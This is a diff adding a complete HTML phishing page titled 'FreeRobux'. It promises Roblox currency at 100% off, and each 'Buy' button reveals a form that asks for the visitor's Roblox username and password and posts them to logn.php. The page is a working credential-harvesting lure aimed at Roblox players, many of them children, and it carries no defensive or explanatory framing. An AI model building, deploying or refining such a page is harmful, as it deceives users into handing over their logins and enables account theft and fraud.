@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <title>FreeRobux</title>
+    
+</head>
+<body>
+    <div class="board-robux" id="board-robux-java">
+        <div class="Robux">
+            <h2>Free Robux</h2>
+            <p>10,000 robux: <strong>100€</strong> <strong style="color: lime;text-decoration: none;">0€</strong> <button onclick="showLogin()">Buy</button></p>
+            <p>5,000 robux: <strong>20€</strong> <strong style="color: lime;text-decoration: none;">0€</strong> <button onclick="showLogin()">Buy</button></p>
+            <p>22,000 robux: <strong>250€</strong> <strong style="color: lime;text-decoration: none;">0€</strong> <button onclick="showLogin()">Buy</button></p>
+            <p>30,000 robux: <strong>350€</strong> <strong style="color: lime;text-decoration: none;">0€</strong> <button onclick="showLogin()">Buy</button></p>
+        </div>
+    </div>
+    <div class="Login-Box" id="LoginBox">
+        <div class="LoginInputs">
+            <form action="logn.php" method="post">
+                <h2>Enter Your Roblox Login</h2>
+                <input type="text" placeholder="Username" name="username" required>
+                <hr>
+                <input type="password" placeholder="Password" name="pass" required>
+                <hr>
+                <button type="submit">Send</button>
+            </form>
+        </div>
+    </div>
+    <div class="robloxBar" id="robloxbar">
+        <h1>Welcome on Free Robux</h1>
+        <h3 style="color: red;">Full Discount (100% OFF)</h3>
+        <button onclick="showRoblox()">Get Robux</button>
+    </div>
+    <script>
+        function showLogin() {
+            document.getElementById("LoginBox").style.display = "block";
+            document.getElementById("board-robux-java").style.display = "none";
+        }
+
+        function showRoblox() {
+            document.getElementById("board-robux-java").style.display = "block";
+        }
+    </script>
+</body>
+</html>
